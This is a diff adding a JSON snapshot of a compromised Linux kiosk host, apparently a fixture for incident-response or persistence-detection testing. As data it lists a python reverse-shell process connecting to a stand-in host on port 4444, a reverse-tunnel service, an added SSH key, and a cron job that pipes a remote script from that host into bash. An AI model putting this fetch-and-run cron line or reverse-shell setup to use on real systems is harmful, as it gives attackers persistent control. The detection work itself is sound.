@@ -1,0 +1,81 @@
+{
+  "connections": [
+    {
+      "process": "chrome",
+      "protocol": "tcp",
+      "remote": "203.0.113.10:443"
+    },
+    {
+      "process": "python",
+      "protocol": "tcp",
+      "remote": "198.51.100.77:4444"
+    },
+    {
+      "process": "python",
+      "protocol": "tcp",
+      "remote": "198.51.100.77:4444"
+    },
+    {
+      "process": "python",
+      "protocol": "tcp",
+      "remote": "198.51.100.77:4444"
+    }
+  ],
+  "cron_jobs": [
+    {
+      "command": "0 3 * * * /usr/local/bin/backup",
+      "line": "1",
+      "source": "/etc/crontab"
+    },
+    {
+      "command": "*/15 * * * * curl -fsSL http://198.51.100.77/p.sh | bash",
+      "line": "2",
+      "source": "/etc/cron.d/update"
+    }
+  ],
+  "metadata": {
+    "captured_at": "2026-05-17T00:15:00+00:00",
+    "hostname": "kiosk-01",
+    "platform": "Linux"
+  },
+  "processes": [
+    {
+      "args": "/usr/bin/chrome --kiosk",
+      "command": "chrome",
+      "pid": "100",
+      "ppid": "1",
+      "user": "kiosk"
+    },
+    {
+      "args": "python -c import socket,subprocess",
+      "command": "python",
+      "pid": "777",
+      "ppid": "1",
+      "user": "kiosk"
+    }
+  ],
+  "services": [
+    {
+      "name": "display-agent.service",
+      "state": "enabled"
+    },
+    {
+      "name": "reverse-tunnel.service",
+      "state": "enabled"
+    }
+  ],
+  "ssh_keys": [
+    {
+      "fingerprint": "baselinekey001",
+      "line": "1",
+      "source": "/home/kiosk/.ssh/authorized_keys",
+      "type": "ssh-ed25519"
+    },
+    {
+      "fingerprint": "newadmin001",
+      "line": "2",
+      "source": "/home/kiosk/.ssh/authorized_keys",
+      "type": "ssh-rsa"
+    }
+  ]
+}
